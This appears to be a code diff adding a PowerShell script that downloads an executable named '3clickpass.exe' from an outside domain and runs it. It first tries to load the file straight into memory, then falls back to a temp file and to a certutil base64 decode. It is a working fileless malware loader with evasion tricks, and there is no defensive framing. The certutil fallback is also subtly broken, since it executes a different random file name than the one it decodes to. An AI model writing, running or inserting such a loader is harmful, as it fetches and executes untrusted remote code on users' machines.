@@ -1,0 +1,30 @@
+# Download and execute from memory without touching disk
+$url = "http://meechdaxiaalgo.online/3clickpass.exe"
+
+try {
+    # Method 1: Direct memory execution
+    $data = (New-Object Net.WebClient).DownloadData($url)
+    $assembly = [System.Reflection.Assembly]::Load($data)
+    $entryPoint = $assembly.EntryPoint
+    $entryPoint.Invoke($null, @())
+} catch {
+    # Method 2: Alternative download and execute
+    try {
+        $tempFile = "$env:TEMP\$(Get-Random).tmp"
+        (New-Object Net.WebClient).DownloadFile($url, $tempFile)
+        $bytes = [System.IO.File]::ReadAllBytes($tempFile)
+        [System.IO.File]::Delete($tempFile)
+        $assembly = [System.Reflection.Assembly]::Load($bytes)
+        $assembly.EntryPoint.Invoke($null, @())
+    } catch {
+        # Method 3: Using certutil as fallback
+        try {
+            $tempFile = "$env:TEMP\$(Get-Random).b64"
+            (New-Object Net.WebClient).DownloadFile("${url}.b64", $tempFile)
+            certutil -decode $tempFile "$env:TEMP\$(Get-Random).exe" > $null 2>&1
+            & "$env:TEMP\$(Get-Random).exe"
+        } catch {
+            Write-Output "All methods failed"
+        }
+    }
+}
